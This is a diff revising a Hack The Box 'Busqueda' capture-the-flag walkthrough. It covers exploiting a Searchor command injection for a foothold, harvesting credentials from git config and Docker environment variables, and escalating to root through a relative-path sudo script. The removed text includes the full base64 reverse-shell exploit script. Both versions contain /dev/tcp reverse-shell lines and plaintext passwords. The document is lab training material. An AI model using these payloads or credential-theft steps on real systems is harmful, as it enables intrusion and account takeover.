@@ -1,279 +1,187 @@
 # HTB Busqueda
 
-scope: 10.129.228.217
+### Scope: 10.129.228.217
 
-First we ran SYN scan on the target (first 1000 ports) with the -A flag on:
+To begin, we performed an **SYN scan** on the target (first 1000 ports) with aggressive scanning enabled:
 
-	nmap -sS -A 10.129.228.217 -oN scan.txt
-
+```bash
+nmap -sS -A 10.129.228.217 -oN scan.txt
 ```
-# Nmap 7.95 scan initiated Thu Mar 27 12:08:05 2025 as: /usr/lib/nmap/nmap --privileged -sS -A -oN scan.txt 10.129.228.217
-Nmap scan report for searcher.htb (10.129.228.217)
-Host is up (0.038s latency).
-Not shown: 998 closed tcp ports (reset)
+
+#### Nmap Scan Results
+
+The scan revealed two open ports:
+
+- **22/tcp (SSH)** – Running OpenSSH 8.9p1 on Ubuntu
+- **80/tcp (HTTP)** – Hosting an Apache 2.4.52 web server, with a Python-based Flask application using Werkzeug 2.1.2
+
+```bash
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey:
-|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
-|_  256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)
 80/tcp open  http    Apache httpd 2.4.52
-| http-server-header:
-|   Apache/2.4.52 (Ubuntu)
-|_  Werkzeug/2.1.2 Python/3.10.6
-|_http-title: Searcher
-Device type: general purpose
-Running: Linux 5.X
-OS CPE: cpe:/o:linux:linux_kernel:5
-OS details: Linux 5.0 - 5.14
-Network Distance: 2 hops
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-TRACEROUTE (using port 80/tcp)
-HOP RTT      ADDRESS
-1   83.74 ms 10.10.16.1
-2   28.19 ms searcher.htb (10.129.228.217)
-
-OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-# Nmap done at Thu Mar 27 12:08:16 2025 -- 1 IP address (1 host up) scanned in 11.06 seconds
 ```
 
-The hostname `searcher.htb` was identified as being the box's hostname so an entry to `/etc/hosts` was created.
+The hostname `searcher.htb` was identified, so an entry was added to `/etc/hosts`:
 
-`sudo echo "10.129.228.217 searcher.htb" >> /etc/hosts`
+```bash
+sudo echo "10.129.228.217 searcher.htb" >> /etc/hosts
+```
 
-Then we checked out the application being served in port 80.
+### Web Enumeration
+
+Navigating to `http://searcher.htb`, we encountered a **Flask-based web application** named **Searcher**. The application’s footer provided useful insights into its dependencies and framework versions.
 
 ![](./assets/searcher-flask-app.png)
-
-The footer is particularly revealing
-
 ![](./assets/searcher-footer.png)
 
-On Searchor's [github page](https://github.com/ArjunSharda/Searchor/security), we find a Vulnerability disclosure and a link to another github repo with a PoC.
+#### Identifying a Known Vulnerability
 
-![](./assets/searchor-security.png)
+Upon investigating the **Searchor** project on GitHub, a **vulnerability disclosure** was found, along with a **proof-of-concept (PoC) exploit** for **Searchor 2.4.0**.
 
-https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection
+- GitHub Security Advisory: [Searchor GitHub](https://github.com/ArjunSharda/Searchor/security)
+- PoC Exploit: [GitHub PoC](https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection)
 
-![](./assets/searchor-vuln.png)
+### Exploiting Command Injection
 
-we download the PoC code and execute:
+The PoC exploit leverages a **command injection vulnerability** in the search functionality. The crafted payload executes arbitrary Python commands via **unsanitized user input**.
 
-```
-#!/bin/bash -
+#### Reverse Shell Execution
 
-default_port="9001"
-port="${3:-$default_port}"
-rev_shell_b64=$(echo -ne "bash  -c 'bash -i >& /dev/tcp/$2/${port} 0>&1'" | base64)
-evil_cmd="',__import__('os').system('echo ${rev_shell_b64}|base64 -d|bash -i')) # junky comment"
-plus="+"
+After modifying the PoC, we executed the following steps to gain a foothold:
 
-echo "---[Reverse Shell Exploit for Searchor <= 2.4.2 (2.4.0)]---"
+1. **Start a netcat listener:**
+   ```bash
+   nc -lvnp 1337
+   ```
+2. **Execute the exploit script:**
+   ```bash
+   ./exploit.sh searcher.htb 10.10.16.32 1337
+   ```
 
-if [ -z "${evil_cmd##*$plus*}" ]
-then
-    evil_cmd=$(echo ${evil_cmd} | sed -r 's/[+]+/%2B/g')
-fi
-
-if [ $# -ne 0 ]
-then
-    echo "[*] Input target is $1"
-    echo "[*] Input attacker is $2:${port}"
-    echo "[*] Run the Reverse Shell... Press Ctrl+C after successful connection"
-    curl -s -X POST $1/search -d "engine=Google&query=${evil_cmd}" 1> /dev/null
-else
-    echo "[!] Please specify a IP address of target and IP address/Port of attacker for Reverse Shell, for example:
-
-./exploit.sh <TARGET> <ATTACKER> <PORT> [9001 by default]"
-fi
-```
-
-The script crafts a reverse shell and makes sure it is safe to transmit via HTTP by encoding it to base64
-Assuming the Flask app behind it doesn't sanitize its inputs we should be able to execute arbitrary Python code as the user running the webapp process.
-
-So in one terminal we start up our netcat listener `nc -lvnp 1337`
-and on another we run our exploit:
-`./exploit.sh searcher.htb 10.10.16.32`
-
-et voilà we get a reverse shell as the user `svc`
+This granted a **reverse shell** as the user `svc`.
 
 ![](./assets/user.png)
 
-looking around we immediately notice the `.git/config` file
+---
 
-![](./assets/git-config.png)
+## Privilege Escalation
 
-```
-cat /var/www/app/.git/config
-[core]
-        repositoryformatversion = 0
-        filemode = true
-        bare = false
-        logallrefupdates = true
+### Credential Discovery
+
+Examining the application directory, we discovered a **Git repository configuration file** (`.git/config`), which contained hardcoded credentials:
+
+```ini
 [remote "origin"]
-        url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
-        fetch = +refs/heads/*:refs/remotes/origin/*
-[branch "main"]
-        remote = origin
-        merge = refs/heads/main
+    url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
 ```
 
-which contains git credentials `cody:jh1usoih2bkjaspwe92`
+Additionally, a **Gitea instance** (`gitea.searcher.htb`) was identified, prompting an update to `/etc/hosts`:
 
-we also see notice the `gitea.searcher.htb` subdomain
-
-so we add it to our hosts file for a later visit
-
-`sudo echo "10.129.228.217 gitea.searcher.htb" >> /etc/hosts`
-
-python3 is installed on the box so we spawn a pseudo terminal to upgrade our reverse shell
-`python3 -c 'import pty; pty.spawn("/bin/bash")'`
-
-as part of our privilege escalation heuristic we run `sudo -l` to check for superuser privileges, when asked for svc's password we try with cody's which we found earlier
-
-```
-svc@busqueda:/var/www/app$ python3 -c 'import pty; pty.spawn("/bin/bash")'
-svc@busqueda:/var/www/app$ sudo -l
-[sudo] password for svc: jh1usoih2bkjaspwe92
-
-Matching Defaults entries for svc on busqueda:
-    env_reset, mail_badpass,
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
-    use_pty
-
-User svc may run the following commands on busqueda:
-    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
+```bash
+sudo echo "10.129.228.217 gitea.searcher.htb" >> /etc/hosts
 ```
 
-Seems like we can run `sudo /usr/bin/python3 /opt/scripts/system-checkup.py *` as root but we cannot read the script's contents
+### Shell Upgrade
 
-```
-svc@busqueda:/var/www/app$ ls -alh /opt/scripts/system-checkup.py
--rwx--x--x 1 root root 1.9K Dec 24  2022 /opt/scripts/system-checkup.py
-```
+To enhance shell stability, we spawned an **interactive TTY shell**:
 
-From running the script as it is intended we get a bounty of information:
-```
-Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)
-
-     docker-ps     : List running docker containers
-     docker-inspect : Inpect a certain docker container
-     full-checkup  : Run a full system checkup
-
-svc@busqueda:/var/www/app$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
-CONTAINER ID   IMAGE                COMMAND                  CREATED       STATUS       PORTS                                             NAMES
-960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   2 years ago   Up 5 hours   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
-f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   2 years ago   Up 5 hours   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db
-
-svc@busqueda:/var/www/app$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect
-Usage: /opt/scripts/system-checkup.py docker-inspect <format> <container_name>
-svc@busqueda:/var/www/app$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
-Something went wrong
-svc@busqueda:/var/www/app$
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
-There are two containers running on this box, one is running a gitea instance and the other a mysql database
+### Abusing Sudo Privileges
 
-The `docker-inspect` subcommand seems to be a wrapper of `docker inspect` with which we can take a closer look at the running containers, specifically their configured environment variables:
+Running `sudo -l` with **svc** (using the discovered `cody` password) revealed **root execution privileges** on a Python script:
 
-```
-svc@busqueda:/var/www/app$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
-CONTAINER ID   IMAGE                COMMAND                  CREATED       STATUS       PORTS                                             NAMES
-960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   2 years ago   Up 5 hours   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
-f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   2 years ago   Up 5 hours   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db
-
-svc@busqueda:/var/www/app$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{ .Config.Env }}' 960873171e2e
-[USER_UID=115 USER_GID=121 GITEA__database__DB_TYPE=mysql GITEA__database__HOST=db:3306 GITEA__database__NAME=gitea GITEA__database__USER=gitea GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin USER=git GITEA_CUSTOM=/data/gitea]
-
-svc@busqueda:/var/www/app$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{ .Config.Env }}' f84a6b33fb5a
-[MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF MYSQL_USER=gitea MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh MYSQL_DATABASE=gitea PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin GOSU_VERSION=1.14 MYSQL_MAJOR=8.0 MYSQL_VERSION=8.0.31-1.el8 MYSQL_SHELL_VERSION=8.0.31-1.el8]
+```bash
+(ALL) NOPASSWD: /usr/bin/python3 /opt/scripts/system-checkup.py *
 ```
 
-From this we gather two username/password pairs for mysql:
+However, **reading permissions were restricted**, preventing direct inspection of the script.
 
-```
-root:jI86kGUuj87guWr3RyF
-gitea:yuiu1hoiu4i5ho1uh
-```
+### Enumerating Running Containers
 
-From the `docker-ps` output we know that the mysql container port 3306 is bound to the loopback interface so we use the installed mysql client to login as the root user.
+Executing `system-checkup.py` with `docker-ps` revealed two running **Docker containers**:
 
-`mysql -h 127.0.0.1 -u root -p`
-
-
-```
-svc@busqueda:/var/www/app$ mysql -h 127.0.0.1 -u root -p
-Enter password: jI86kGUuj87guWr3RyF
-
-Welcome to the MySQL monitor.  Commands end with ; or \g.
-Your MySQL connection id is 1817
-Server version: 8.0.31 MySQL Community Server - GPL
-
-Copyright (c) 2000, 2023, Oracle and/or its affiliates.
-
-Oracle is a registered trademark of Oracle Corporation and/or its
-affiliates. Other names may be trademarks of their respective
-owners.
-
-Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
-
-mysql> show databases;
-+--------------------+
-| Database           |
-+--------------------+
-| gitea              |
-| information_schema |
-| mysql              |
-| performance_schema |
-| sys                |
-+--------------------+
-5 rows in set (0.00 sec)
+```bash
+sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
 ```
 
-Looking around at the tables on the gitea database we see one called `users` and run the following query:
-`select id, name, passwd from user;`
+- **Gitea container (port 3000)**
+- **MySQL database container (port 3306, loopback only)**
 
-```
-mysql> select id, name, passwd from user;
-+----+---------------+------------------------------------------------------------------------------------------------------+
-| id | name          | passwd                                                                                               |
-+----+---------------+------------------------------------------------------------------------------------------------------+
-|  1 | administrator | ba598d99c2202491d36ecf13d5c28b74e2738b07286edc7388a2fc870196f6c4da6565ad9ff68b1d28a31eeedb1554b5dcc2 |
-|  2 | cody          | b1f895e8efe070e184e5539bc5d93b362b246db67f3a2b6992f37888cb778e844c0017da8fe89dd784be35da9a337609e82e |
-+----+---------------+------------------------------------------------------------------------------------------------------+
-2 rows in set (0.00 sec)
+We then **inspected the container environment variables** looking for credentials:
+
+```bash
+sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{ .Config.Env }}' <container_id>
 ```
 
-There are only two users on the database, time to pay `gitea.searcher.htb` a visit!
-
-`cody`'s login reveals a repo containing the flask app we used to gain a foothold on the system and not much more.
-
-Using `administrator:yuiu1hoiu4i5ho1uh` as login credentials we find a `scripts` repo that contains what seems to be the python tool we used earlier, the `full-checkup` subcommand on the `system-checkup.py` script looks particularly interesting:
+This yielded **MySQL root credentials**:
 
 ```
-[...]
-    elif action == 'full-checkup':
-        try:
-            arg_list = ['./full-checkup.sh']
-            print(run_command(arg_list))
-            print('[+] Done!')
-        except:
-            print('Something went wrong')
-            exit(1)
-[...]
-
+MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF
 ```
 
-As we know, python looks at the current directory when using relative paths so this would explain the output of the command `full-checkup` being `'Something went wrong'` as there is no file `full-checkup.sh` in `/var/www/app` (Flask app root directory).
-So we create it with a command of our choice, for example:
+and a **Gitea database password**:
 
 ```
-#!/bin/bash
-bash -i >& /dev/tcp/10.10.16.32/5656 0>&1
+GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh
 ```
 
-Running `nc -lvnp 5656` on our local machine plus `sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup` will have a reverse shell connect back to us and we have root!
+### Gaining Database Access
 
-![](./assets/privesc-exec.png)
+Since MySQL was bound to **127.0.0.1:3306**, we used the **root credentials** to access it locally:
+
+```bash
+mysql -h 127.0.0.1 -u root -p
+```
+
+From the **`gitea` database**, we extracted user details:
+
+```sql
+SELECT id, name, passwd FROM user;
+```
+
+This included the **administrator** username, which we then paired with `yuiu1hoiu4i5ho1uh` to log in to **Gitea**.
+
+### Exploiting a Misconfigured Python Script
+
+Inside **Gitea**, we located the repository containing `system-checkup.py`, which included an **unsafe execution call**:
+
+```python
+elif action == 'full-checkup':
+    try:
+        arg_list = ['./full-checkup.sh']
+        print(run_command(arg_list))
+    except:
+        print('Something went wrong')
+```
+
+Since Python **searches the current directory first** for relative paths, we exploited this by **creating a malicious script** in the expected location:
+
+```bash
+echo '#!/bin/bash' > full-checkup.sh
+echo 'bash -i >& /dev/tcp/10.10.16.32/5656 0>&1' >> full-checkup.sh
+chmod +x full-checkup.sh
+```
+
+Executing the vulnerable script as `root`:
+
+```bash
+sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
+```
+
+Triggered a **reverse shell as root**, successfully **compromising the system**.
 ![](./assets/root.png)
+---
 
+## Conclusion
+
+The **Busqueda** machine demonstrated several **critical security weaknesses**:
+
+1. **Unsanitized User Input** – Allowed **command injection**, leading to **initial access**.
+2. **Password Reuse** – Hardcoded credentials enabled **lateral movement**.
+3. **Inappropriate Application Bundling** – Exposed unnecessary services, increasing the attack surface.
+4. **Custom System Administration Practices** – Poorly implemented scripts enabled **privilege escalation**.
+
+This challenge underscores the importance of **input validation, secure credential management, minimal software exposure, and adherence to best practices** in system administration.
